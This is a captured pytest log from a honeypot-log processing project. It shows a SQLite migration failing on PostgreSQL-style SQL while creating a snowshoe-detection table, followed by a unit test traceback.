2025-10-18 18:32:38,815:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:38,815:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:38,815:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:38,815:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:38,815:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:38,815:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:38,815:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:38,815:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:38,815:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:38,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,820:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,820:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,820:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,820:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,820:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,820:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,820:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,820:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,820:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,820:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,822:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,822:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,822:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,822:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,822:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,822:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,822:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,822:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,822:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,822:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,823:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,823:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,823:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,823:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,823:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,823:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,823:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,823:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,823:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,823:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,827:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,827:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,827:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,827:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,827:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,827:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,827:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,827:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,827:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,827:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:38,828:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:38,828:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:38,828:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:38,828:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:38,828:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:38,828:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:38,828:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:38,828:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:38,828:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:38,828:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
______ TestQuarantinePayloadFix.test_non_dict_payload_creates_dead_letter ______

self = <test_quarantine_payload_fix.TestQuarantinePayloadFix object at 0x7756b32b1f90>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_non_dict_payload_creates_0')

    def test_non_dict_payload_creates_dead_letter(self, tmp_path: Path) -> None:
        """Test that non-dict payloads create proper dead letter events."""
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_quarantine_payload_fix.py:70: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_quarantine_payload_fix.py:28: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
